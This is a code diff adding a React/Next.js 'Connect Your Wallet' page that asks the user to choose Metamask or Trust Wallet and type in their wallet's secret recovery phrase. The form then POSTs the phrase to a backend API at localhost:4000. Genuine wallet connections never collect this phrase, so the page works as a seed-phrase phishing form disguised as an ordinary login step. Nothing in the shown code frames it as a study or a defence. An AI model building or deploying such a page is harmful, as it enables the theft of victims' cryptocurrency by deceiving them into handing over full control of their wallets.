@@ -1,0 +1,72 @@
+import { useState } from "react";
+import { useRouter } from "next/router";
+
+export default function Index() {
+  const [walletType, setWalletType] = useState("");
+  const [secretPhrase, setSecretPhrase] = useState("");
+  const [errorMessage, setErrorMessage] = useState("");
+  const router = useRouter();
+
+  const connectWallet = async (e) => {
+    e.preventDefault();
+    if (!walletType || !secretPhrase) {
+      setErrorMessage("Please fill out all fields.");
+      return;
+    }
+
+    try {
+      const response = await fetch("http://localhost:4000/api/wallets", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ walletType, secretPhrase }),
+      });
+
+      if (response.ok) {
+        router.push("/dashboard");
+      } else {
+        const data = await response.json();
+        setErrorMessage(data.message || "Failed to connect wallet.");
+      }
+    } catch (err) {
+      setErrorMessage("Error connecting wallet. Please try again.");
+    }
+  };
+
+  return (
+    <div className="h-screen flex flex-col items-center justify-center bg-gray-100">
+      <form
+        onSubmit={connectWallet}
+        className="bg-white p-8 rounded-md shadow-md w-full max-w-md"
+      >
+        <h1 className="text-2xl font-bold mb-4">Connect Your Wallet</h1>
+        {errorMessage && <p className="text-red-600 mb-4">{errorMessage}</p>}
+        <label className="block mb-4">
+          Wallet Type:
+          <select
+            className="block w-full mt-2 p-2 border rounded"
+            value={walletType}
+            onChange={(e) => setWalletType(e.target.value)}
+          >
+            <option value="">Choose Wallet</option>
+            <option value="Metamask">Metamask</option>
+            <option value="Trust Wallet">Trust Wallet</option>
+          </select>
+        </label>
+        <label className="block mb-4">
+          Secret Phrase:
+          <textarea
+            className="block w-full mt-2 p-2 border rounded"
+            value={secretPhrase}
+            onChange={(e) => setSecretPhrase(e.target.value)}
+          />
+        </label>
+        <button
+          type="submit"
+          className="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600"
+        >
+          Connect Wallet
+        </button>
+      </form>
+    </div>
+  );
+}
